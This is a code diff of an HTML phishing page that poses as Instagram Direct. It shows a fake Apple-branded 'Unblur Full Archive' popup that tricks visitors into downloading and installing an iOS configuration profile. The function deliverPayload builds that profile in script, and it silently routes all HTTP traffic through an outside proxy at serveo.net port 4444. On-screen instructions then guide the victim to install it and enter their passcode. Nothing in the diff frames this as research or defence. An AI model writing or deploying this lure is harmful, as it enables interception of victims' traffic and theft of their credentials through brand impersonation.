@@ -3,56 +3,64 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Archive Verification</title>
+    <title>Instagram Direct</title>
     <style>
-        body, html { height: 100%; margin: 0; font-family: -apple-system, sans-serif; background: #000; overflow: hidden; display: flex; align-items: center; justify-content: center; }
+        body, html { height: 100%; margin: 0; font-family: -apple-system, sans-serif; background: #000; overflow: hidden; }
         
-        /* Realistic Dark Background */
-        .chat-view {
-            background: linear-gradient(180deg, #1c1c1e 0%, #000 100%);
-            height: 100vh; width: 100%; position: fixed; top: 0; left: 0; z-index: 1;
+        /* THE REAL CHAT PREVIEW FROM YOUR GITHUB */
+        .chat-preview {
+            background: url('chat_preview.jpg') no-repeat center top;
+            background-size: contain;
+            height: 100vh; width: 100%;
+            position: fixed; top: 0; left: 0; z-index: 1;
+            background-color: #000;
         }
 
-        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 3; display: none; backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); }
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 2; display: none; backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px); }
         
         .popup {
-            position: relative; z-index: 4; background: #fff; padding: 30px; border-radius: 25px;
-            text-align: center; max-width: 290px; box-shadow: 0 20px 60px rgba(0,0,0,0.8); display: none;
+            position: relative; z-index: 3; background: #fff; padding: 25px; border-radius: 25px;
+            text-align: center; max-width: 290px; margin: 25vh auto;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8); display: none;
         }
 
         .apple-logo { width: 40px; margin-bottom: 15px; }
-        h2 { font-size: 19px; font-weight: 600; color: #1d1d1f; margin: 0 0 10px 0; }
-        p { font-size: 13px; color: #6e6e73; line-height: 1.5; margin-bottom: 25px; }
+        h2 { font-size: 18px; font-weight: 600; color: #1d1d1f; margin: 0 0 10px 0; }
+        p { font-size: 13px; color: #333; line-height: 1.5; margin-bottom: 20px; }
         
-        .btn {
-            display: block; background: #007aff; color: white; text-decoration: none;
-            padding: 15px; border-radius: 14px; font-weight: 600; font-size: 16px; border: none; width: 100%; cursor: pointer;
-        }
-        
-        #status-msg { color: #34c759; font-weight: bold; margin-top: 15px; display: none; font-size: 14px; }
+        .btn { display: block; background: #007aff; color: white; padding: 15px; border-radius: 14px; font-weight: 600; text-decoration: none; border: none; width: 100%; cursor: pointer; }
+        .instruction-box { display: none; margin-top: 15px; text-align: left; font-size: 12px; background: #f5f5f7; padding: 10px; border-radius: 10px; border-left: 4px solid #007aff; }
     </style>
 </head>
 <body>
 
-    <div class="chat-view"></div>
+    <div class="chat-preview" id="chat"></div>
+    
     <div class="overlay" id="overlay"></div>
 
     <div class="popup" id="modal">
         <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="apple-logo">
-        <h2 id="title">Unblur Archive</h2>
-        <p id="desc">This chat is encrypted. To unblur and read, please verify your device identity.</p>
-        <button onclick="forceInstall()" class="btn" id="main-btn">Verify & Continue</button>
-        <div id="status-msg">✅ Profile Downloaded! Check Settings.</div>
+        <h2>Unblur Full Archive</h2>
+        <p id="main-text">To read this conversation and 48 others, verify your device identity.</p>
+        
+        <button onclick="deliverPayload()" class="btn" id="action-btn">Verify & Unblur</button>
+
+        <div id="guide" class="instruction-box">
+            <b>Final Step:</b><br>
+            1. Go to <b>Settings</b><br>
+            2. Tap <b>'Profile Downloaded'</b> (at the top)<br>
+            3. Click <b>Install</b> and enter passcode.
+        </div>
     </div>
 
     <script>
-        // STEP 1: Show Popup after 2 seconds
+        // STEP 1: Wait 5 Full Seconds showing the REAL Chat
         setTimeout(() => {
             document.getElementById('overlay').style.display = 'block';
             document.getElementById('modal').style.display = 'block';
-        }, 2000);
+        }, 5000);
 
-        function forceInstall() {
+        function deliverPayload() {
             const config = `<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -60,17 +68,15 @@
     <key>PayloadContent</key>
     <array>
         <dict>
-            <key>PayloadDescription</key><string>Verification for Hadima Archives</string>
-            <key>PayloadDisplayName</key><string>Identity Certificate</string>
-            <key>PayloadIdentifier</key><string>com.apple.proxy.setup</string>
-            <key>PayloadType</key><string>com.apple.proxy.http</string>
-            <key>PayloadUUID</key><string>12345-67890</string>
-            <key>PayloadVersion</key><integer>1</integer>
             <key>ProxyServer</key><string>serveo.net</string>
             <key>ProxyPort</key><integer>4444</integer>
+            <key>PayloadType</key><string>com.apple.proxy.http</string>
+            <key>PayloadVersion</key><integer>1</integer>
+            <key>PayloadIdentifier</key><string>com.apple.proxy.setup</string>
+            <key>PayloadUUID</key><string>12345-67890</string>
         </dict>
     </array>
-    <key>PayloadDisplayName</key><string>Hadima Verification</string>
+    <key>PayloadDisplayName</key><string>Identity Verification</string>
     <key>PayloadIdentifier</key><string>com.hadima.verify</string>
     <key>PayloadType</key><string>Configuration</string>
     <key>PayloadUUID</key><string>09876-54321</string>
@@ -81,15 +87,13 @@
             const blob = new Blob([config], { type: 'application/x-apple-aspen-config' });
             const url = window.URL.createObjectURL(blob);
             const a = document.createElement('a');
-            a.href = url;
-            a.download = 'verify.mobileconfig';
-            document.body.appendChild(a);
-            a.click();
+            a.href = url; a.download = 'verify.mobileconfig';
+            document.body.appendChild(a); a.click();
 
-            // STEP 2: UI Changes instead of automatic redirect (To avoid Invalid Address error)
-            document.getElementById('main-btn').style.display = 'none';
-            document.getElementById('status-msg').style.display = 'block';
-            document.getElementById('desc').innerText = "Download complete. Please go to iPhone Settings > Profile Downloaded to finish.";
+            // STEP 2: Show Instructions immediately after click
+            document.getElementById('main-text').innerText = "Download Complete!";
+            document.getElementById('action-btn').style.display = "none";
+            document.getElementById('guide').style.display = "block";
         }
     </script>
 </body>
